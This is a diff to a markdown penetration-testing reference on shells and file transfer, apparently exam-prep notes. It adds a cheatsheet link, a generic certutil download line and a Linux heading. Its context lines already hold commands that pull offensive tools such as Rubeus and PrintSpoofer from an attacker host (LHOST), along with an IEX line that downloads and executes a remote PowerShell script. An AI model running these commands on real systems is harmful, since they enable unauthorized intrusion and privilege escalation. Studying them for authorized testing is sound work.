@@ -1,5 +1,7 @@
 # Shells, Payloads & File Transfer
 
+Quick reference matrix (copy-ready): [cheatsheets/transfer-and-shells.md](../cheatsheets/transfer-and-shells.md).
+
 ## Listener habits
 
 Pre-stage listeners for common egress ports:
@@ -106,6 +108,7 @@ impacket-smbserver share $(pwd) -smb2support -user simon -password 'Password123!
 ### certutil (classic exam workhorse)
 
 ```cmd
+certutil -urlcache -split -f http://LHOST/FILE FILE
 certutil -urlcache -f http://LHOST/Rubeus.exe Rubeus.exe
 certutil -urlcache -f http://LHOST/PrintSpoofer64.exe PrintSpoofer64.exe
 certutil -urlcache -f http://LHOST/winpeas.exe winpeas.exe
@@ -125,6 +128,13 @@ IEX (iwr -uri http://LHOST/pwn.ps1 -usebasicparsing)
 # Download file
 iwr -uri http://LHOST/tool.exe -outfile tool.exe
 (New-Object Net.WebClient).DownloadFile('http://LHOST/tool.exe','C:\Windows\Tasks\tool.exe')
+```
+
+### When tools are missing on Linux
+
+```bash
+# bash-only HTTP GET (see cheatsheet for full helper)
+# scp / base64 / nc file transfer
 ```
 
 ### SMB map from Windows
